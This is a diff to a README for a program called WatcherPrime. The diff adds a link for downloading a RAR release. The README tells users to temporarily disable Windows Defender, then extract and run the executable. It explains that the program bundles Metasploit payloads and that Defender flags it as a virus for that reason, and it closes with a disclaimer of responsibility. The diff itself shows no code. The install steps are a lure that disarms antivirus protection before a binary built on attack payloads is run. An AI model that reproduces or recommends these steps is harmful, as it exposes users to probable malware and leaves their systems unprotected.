@@ -23,13 +23,15 @@ This program was made using python3.10, some Metasploit payloads, lots of free t
 Since the program uses several metasploit payloads for obvious reasons windows defender mistakes it as a virus.
 Therefore to install it:
 
-1- Temporarily disable Windows Defender from your settings.
+1-[Download](https://github.com/beelz3bubs/WatcherPrime/releases/download/v1.0/WatcherPrime.Setup.rar) the latest release.
 
-2-Extract the exe from the RAR file.
+2- Temporarily disable Windows Defender from your settings.
 
-3-Begin Installation Process.
+3-Extract the exe from the RAR file.
 
-4-Run the Program and enjoy watching. :)
+4-Begin Installation Process.
+
+5-Run the Program and enjoy watching. :)
 ## Disclaimer
 
 I, the creator, am not responsible for any actions, and or damages, caused by this software.
